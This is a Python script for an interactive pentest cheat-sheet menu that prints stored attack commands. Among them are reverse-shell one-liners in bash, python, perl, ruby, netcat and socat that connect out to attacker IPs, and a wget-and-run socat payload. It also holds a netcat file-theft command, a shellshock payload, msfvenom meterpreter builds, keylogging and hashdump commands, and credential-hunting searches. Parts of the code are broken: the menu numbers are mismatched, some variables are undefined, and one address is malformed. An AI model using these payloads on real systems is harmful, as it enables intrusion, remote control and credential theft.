G = '\x1b[1;32m'
R = '\x1b[31m'

# Console colors
bg ='' # '\033[44m'  # gray
W = bg+'\033[0m'  # white (normal)
R = bg+'\033[31m'  # red
G = bg+'\033[32m'  # green
O = bg+'\033[33m'  # orange
B = bg+'\033[34m'  # blue
P = bg+'\033[35m'  # purple
C = bg+'\033[36m'  # cyan
GR = bg+'\033[37m'  # gray
Y="\033[33m"
import requests
def simple_server():
    pythonserver3='''python3 -m http.server 9999'''
    pythonserver='''python3 -m SimpleHTTPServer 9999'''
    curl = "curl -O http://192.168.1.106/putty.exe "

    SMB_server = '''
    • Downloading the file from Linux SMB server in Ubuntu Machine

      If you are an Ubuntu user then you can use smbclient service for accessing share folder of smb server.

    $ apt-get install smbclient

    Now execute given below command for accessing shared folder of the server.

     $   smbclient -L 192.168.1.108

      $smbclient // 192.168.1.1.108 / ahmed
     '''
    options=['1-pythonserver3',"2-pythonserver","3-SMB_server","4-SMB_server"]
    for i in options:    print(i)

    x=input ("put choicec :")
    if x=="1":
        print(pythonserver3)
    elif x=="2":
            print(pythonserver)
    elif x=="3":
        print(curl)
    elif x=="4":
        print(SMB_server)

    else:
        print("try again")
def backdoors():



    options=['\033[33m1-python','2-supercat','3-bash',"4-wget",'5-netcat','6-ncload',"7-socat","8-peral","9-ruby","*"]
    for i in options:    print(i)
    python='''# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#'''
    supercat='''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f'''
    bash='''bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'''
    wget='''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  '''
    netcat='''
        On Kali (listen):

        nc -lvp  8989

        On Victim (launch):

        nc -e /bin/sh 127.0.0.1 8989

        '''
    ncload='''
    sdcard →  target file  victom
    # nc -v -w 30 8989 -l < 7.mp4        # here files you want steal
    remote vps  hacker machine  lessener 
    nc -v -w 2  192.168.43.1 8989 >7.mp4  #you use target ip to conect
    '''
    weevely=''' weevely generate pasword file name
     '''
    socat='''
    On Kali (listen):

    socat file:`tty`,raw,echo=0 tcp-listen:4444  

    On Victim (launch):

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.43.94:4444  '''
    peral='''perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'#'''
    ruby='''ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'#'''
    url="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
    #req=requests.get(url)
   # otherplaces=req.text


    opt=input ("put your option pls :")
    if opt=="1":
        print(python)
    elif opt=="2":
            print(supercat)
    elif opt=="3":
        print(bash)
    elif opt=="4":
            print(wget)
    elif opt=="5":
        print(netcat)
    elif opt=="6":
        print(ncload)
    elif opt=="7":
            print(socat)
    elif opt=="8":
        print(peral)
    elif opt=="9":
            print(ruby)
    elif opt=="10":
            print(weevely)
    else:
        print("try this",otherplaces)
        print("*"* 12)
        print("PLS TRY AGAIN")
        print("*"* 12)
def shells():

    print("CHECK_LESEN_PORTS='lsof -i'\033[33m")

    option=['1-find','2-more','3-python',"4-python3",'5-bash',"6-irp",'7-vi','8-echo','9-sh',"10-Perl",'11-ruby',"12-lua","14-shellshock"];
    for i in option:    print(i)


    atack_remotly=" nc -v -l -p 9999 -e/bin/bash nc demo.staionx.com 8080"


    find="find / -name test -exec /bin/sh ; |find / -perm -u=s -type f"


    more =" cd /var/log ; more auth.log #;  !sh"
    
    python='''''python -c 'import pty; pty.spawn("/bin/bash")' ## ctrl +z ## stty raw -echo    ## fg ## reset'''
    python3='''\npython -c 'import pty; pty.spawn("/bin/bash")' ##\n python -c 'import pty; pty.spawn("/bin/sh")' #''' and ''':set shell=/bin/bash:shell #
    mobiles --> python -c 'import pty; pty.spawn("/bin/sh")' #'''

    bash="/bin/sh -i" and '''#exec "/bin/sh"#'''

    irp='''  irp  # exec "/bin/sh" '''
    vi=''':!bash # or# :set shell=/bin/bash:shell'''  


    echo='''echo 'os.system('/bin/bash')'                    #'''


    
    sh='''/bin/sh -i '''

     

      
    Perl='''perl -e 'exec "/bin/sh";' #'''

     
    Ruby ='''ruby: exec "/bin/sh" '''

     
    Lua= '''lua: os.execute('/bin/sh') '''
    shellshock='''() { ignored;};/bin/bash -i >& /dev/tcp/192.168.221.139/443 0>&1'''
    
    source="https://pentestlab.blog/category/privilege-escalation/"

    opt=input ("put your option pls :")
    if opt=="1":
        print(find)
    elif opt=="2":
            print(more)
    elif opt=="3":
        print(python)
    elif opt=="4":
            print(python3)
    elif opt=="5":
            print(bash)
    elif opt=="6":
            print(irp)
    
    elif opt=="7":
            print(vi)
    elif opt=="8":
            print(echo)
    elif opt=="9":
            print(sh)
    elif opt=="10":
            print(Perl)
    
    elif opt=="11":
            print(Ruby)
    elif opt=="12":
            print(Lua)
    elif opt=="14":
            print(shellshock)
    elif opt=="15":
            print(source)
def exploits_tools():
    #
  

    searchsploit='''\033[33m
    searchsploit --update
    searchsploit windows smb remote
    searchsploit windows smb --exclude="DNS|VLC"'''



    Metasploit='''
    service postgresql start
    update-rc.d postgresql enable
    msfdb init
    ---------------
    search tricks
    -------------
    search vsftpd
    search type:exploit smb
    search type:post platform:linux
    search type:post platform:windows

    show {all|exploits|payloads|auxiliary}

    Metasploit Modules
    --------------------
    auxiliary	=> some scripts for enumeration, scanning and etc...
    exploits	=> code to exploit the vulnerability and deliver the payload.
    payloads	=> the code that executed on the victim.
    encoders	=> encode the payloads to another form.
    post		    => post exploitation scripts.
    nops			=> add nops bytes.
    evasion		=> scripts for evasion.


   
    '''

    msfvenom='''\033[33m

    msfvenom -l payloads
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > file.exe
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > file.elf
    msfvenom -p python/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o file.py '''



    msfconsole_listesner='''
    msfconsole_listesner
    --------------------
    use exploit/multi/handler
    set PAYLOAD xxxx
    set LHOST 127.0.0.1
    show options
    exploit
    '''


    Meterpreter_Search='''
    Meterpreter_Search
    -----------------
    Search For Files
    search -h
    search -f test.txt
    search -f *.txt
    search -d c:/users/test -f *.txt 

    Network Commands
    ---------------------
    arp
    ifconfig
    netstat
    route
    portfwd add -l 6666 -p 7777 -r 192.168.1.116 #forward
    portfwd add -R -L 192.168.1.114 -l 6666 -p 7777 #reverse
    '''

    Powerfull_Commands='''\033[35m
    Powerfull_Commands
    ------------------
    getsystem
    hashdump
    screenshot -p /root/screen1.jpeg
    migrate $Explorer_PID
    keyscan_start -v
    keyscan_dump
    keyscan_stop '''



    Post_Exploitation='''\033[33m
    use post/multi/gather/ping_sweep

    use post/multi/recon/local_exploit_suggester
    use exploit/windows/local/bypassuac_eventvwr

    use post/windows/manage/payload_inject
    set handler true
    set lhost 127.0.0.1
    set lport 4444
    set payload windows/meterpreter/reverse_tcp
    set session 1
    run
    '''

    

    filetransfer='''
    transfer by powershell only
    ---------------------------..

    aria2c "http:127.0.0.1"
    ---------
    powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1:8000/file.txt','c:users\\xx.txt')" #Victim Machine
        SMB_server = 
    • Downloading the file from Linux SMB server in Ubuntu Machine

      If you are an Ubuntu user then you can use smbclient service for accessing share folder of smb server.

    $ apt-get install smbclient

    Now execute given below command for accessing shared folder of the server.

     $   smbclient -L 192.168.1.108

      $smbclient // 192.168.1.1.108 / ahmed'''
    options=['1-searchsploit','2-Metasploit','3-msfvenom','4-msfconsole_listesner',"5-Meterpreter_Search",'6-Powerfull_Commands','7-Post_Exploitation',"8-filetransfer",]

    for i in options:    print(i)
    while 1 :


        opt=input (R+"put your option pls :"+G)
        if opt=="0":
            print(searchsploit)
        elif opt=="1":
            print(Metasploit)
        elif opt=="2":
            print(msfvenom)

        elif opt=="3":
            print(msfconsole_listesner)
        elif opt=="4":
                print(Metasploit)
        elif opt=="5":
            print(Meterpreter_Search)
        elif opt=="6":
                print(Powerfull_Commands)
        elif opt=="7":
                print(Post_Exploitation)
        elif opt=="8":
                print(filetransfer)
        
        elif opt=="*":

            exit()



    LOCAL_FILE_ENCO = "https://github.com/D35m0nd142/LFISuite"
    linuxprivchecker = 'https://github.com/sleventyeleven/linuxprivchecker'
    unix_privesc_check = ''' http://pentestmonkey.net/tools/audit/unix-privesc-check'''

def linux_exploit():

    linux_privilage = ''' 
    Operating System


     $ cat  /etc/issue
     $ cat  /etc/*-release
     $ cat  /etc/lsb-release         # Debian based
     $ cat  /etc/redhat-release   # Redhat based

    What's the kernel version? Is it 64-bit?


    $  cat /proc/version
    $ uname -a
    $ uname -mrs
    $ rpm -q kernel
    $ dmesg | grep Linux
    $ ls /boot | grep vmlinuz-

     '''

    Applications_Services = '''
    What services are running? Which service has which user privilege?

    $  ps aux
    $ ps -ef
    $ top
    $ cat /etc/services
    '''

    ps = '''
    $  ps aux | grep root
    $ ps -ef | grep root'''


    scheduled_jobs='''

    $ crontab -l
    $ ls -alh /var/spool/cron
    $ ls -al /etc/ | grep cron
    $ ls -al /etc/cron*
    $ cat /etc/cron*
    $ cat /etc/at.allow
    $ cat /etc/at.deny
    $ cat /etc/cron.allow
    $ cat /etc/cron.deny
    $ cat /etc/crontab
    $ cat /etc/anacrontab
    $ cat /var/spool/cron/crontabs/root '''

    comandline_csv = ''' https://github.com/dotnet/docs/blob/master/docs/csharp/language-reference/compiler-options/command-line-building-with-csc-exe.md'''


    options=['1-linux_privilage','2-Applications_Services','3-Applications_Services',"4-ps",'5-scheduled_jobs','6-windows_password_cleartext',"7-comandline_csv","*"]
    for i in options:    print(i)

    opt=input ("put your option pls :")
    if opt=="1":
        print(linux_privilage)
    elif opt=="2":
            print(Applications_Services)
    elif opt=="3":
        print(Applications_Services)
    elif opt=="4":
            print(ps)
    elif opt=="5":
            print(scheduled_jobs)
    elif opt=="6":
            print(windows_password_cleartext)
    elif opt=="7":
        print(dump_password_offline_from_windows)
def Windows_Exploit():
    #
    wlan_comand = '''wlan comand
    netsh wlan show profile'''
    firewall = '''
    # Firewall
    netsh firewall show state
    netsh firewall show config

    # Network
    ipconfig /all
    route print
    arp -A '''
    Windows_Exploit_Suggester = 'https://github.com/bitsadmin/wesng'

    Windows_Exploit_Suggester = 'https://github.com/AonCyberLabs/Windows-Exploit-Suggester'

    UACMe = "https://github.com/hfiref0x/UACME"
    windows_previlage = '''
    use exploit/windows/local/service_permissions

    post/windows/gather/credentials/gpp

    run post/windows/gather/credential_collector

    run post/multi/recon/local_exploit_suggester

    run post/windows/gather/enum_shares

    run post/windows/gather/enum_snmp

    run post/windows/gather/enum_applications

    run post/windows/gather/enum_logged_on_users

    run post/windows/gather/checkvm'''
    windows_password_cleartext = '''
    [+] Cleartext Passwords :

    findstr /si password *.txt
    findstr /si password *.xml
    findstr /si password *.ini

    # Find all those strings in config files.
    dir /s *pass* == *cred* == *vnc* == *.config*

    # Find all passwords in all files.
    findstr /spin "password" *.*
    findstr /spin "password" *.*
     '''

    dump_password_offline_from_windows = ''' [+] Dumping Plaintext Passwords from Memory with Windows Credential Editor :Why bother
    https://www.ampliasecurity.com/research/windows-credentials-editor/'''
    options=['1-wlan_comand','2-firewall','3-Windows_Exploit_Suggester',"4-UACMe",'5-windows_previlage','6-windows_password_cleartext',"7-dump_password_offline_from_windows","*"]
    for i in options:    print(i)

    opt=input ("put your option pls :")
    if opt=="1":
        print(wlan_comand)
    elif opt=="2":
            print(firewall)
    elif opt=="3":
        print(Windows_Exploit_Suggester)
    elif opt=="4":
            print(UACMe)
    elif opt=="5":
            print(windows_previlage)
    elif opt=="6":
            print(windows_password_cleartext)
    elif opt=="7":
        print(dump_password_offline_from_windows)

def Post_explation():
    lazane = 'https://github.com/AlessandroZ/LaZagne'
    print(lazane)


def exploit():
    option=['1-simple_server','2-backdoors','3-shells',"4-exploit_tools",'5-linux_exploit',"6-Windows_Exploit",'7-Post_explation']
    for i in option:    print(i)
    while 1 :

        opt=input (R+"put your option pls :"+G)
        if opt=="1":
            simple_server()
        elif opt=="2":
            backdoors()
        elif opt=="3":
            shells()

        elif opt=="4":
            exploits_tools()
        elif opt=="5":
            linux_exploit()
        elif opt=="6":
            Windows_Exploit()
        elif opt=="7":
            Post_explation()
        elif opt=="*":
            exit()
